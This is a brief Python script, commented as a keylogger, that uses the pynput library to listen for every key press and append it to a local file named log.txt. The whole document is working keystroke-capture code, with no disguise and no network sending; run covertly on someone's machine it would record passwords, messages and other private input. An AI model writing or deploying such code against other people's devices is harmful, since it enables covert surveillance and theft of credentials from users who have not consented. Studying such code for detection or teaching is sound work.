from pynput.keyboard import Key, Listener

# Function to record key presses
def on_press(key):
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")  # Adds a newline for readability

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()

